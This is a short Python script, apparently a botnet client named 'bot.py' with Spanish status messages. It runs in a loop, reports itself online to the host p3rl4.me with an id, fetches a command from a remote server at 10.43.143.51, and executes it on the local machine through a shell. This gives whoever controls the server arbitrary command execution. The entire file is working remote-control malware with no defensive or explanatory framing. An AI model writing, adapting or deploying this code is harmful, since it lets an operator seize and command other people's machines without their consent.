import requests
import time
import os
from urllib.request import urlopen
import multiprocessing
import subprocess
import sys



def get_cmd():
    global cmd
    cmd = requests.get('http://10.43.143.51/getcmd')
    print("EJECUTANDO ====== "+ cmd.text + " ======")
    p1 = multiprocessing.Process(name="p1",target=run_ssh)
    p1.start()


def run_ssh():
    try:
        output = subprocess.check_output(cmd.text, shell=True).decode('utf-8')
        time.sleep(6)
        requests.get('http://p3rl4.me/cmdfinished')
        print(output)
    except Exception:
        print("Ha habido un error con su comando")


def online():
    try:
        requests.get('http://p3rl4.me/imonline?id='+id)
    except Exception:
        print("No hay conexion con el servidor")

def main():
    while True:
        time.sleep(2)
        try:
            online()
            get_cmd()
        except Exception:
            print("Ha ocurrido un error, Seguramente el servidor no este en linea")

if __name__ == '__main__':
    os.chdir('/')
    global id
    try:
        id=sys.argv[1]
        main()
    except KeyboardInterrupt:
        print("CERRANDO TODO :::::.......")
    except Exception:
        print("""Necesitas proporcionar un id numérico
Ej: python3 bot.py 1""")